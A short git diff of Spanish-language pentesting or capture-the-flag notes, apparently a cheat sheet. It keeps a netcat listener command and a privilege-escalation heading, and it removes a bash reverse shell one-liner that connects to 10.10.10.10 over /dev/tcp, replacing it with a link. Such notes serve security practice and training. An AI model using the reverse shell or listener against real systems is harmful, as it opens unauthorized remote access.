@@ -119,15 +119,11 @@ Esperar conexión:
 nc -lvnp 9001
 ```
 
-[Reverse shell](https://www.revshells.com/):
-
-```bash
-bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
-```
-
-### Escalamiento de Privilegios
+Reverse shells: <https://www.revshells.com/>
 
 Tratamiento de la TTY: <https://invertebr4do.github.io/tratamiento-de-tty/>
+
+### Escalamiento de Privilegios
 
 Permisos de `sudo`:
 
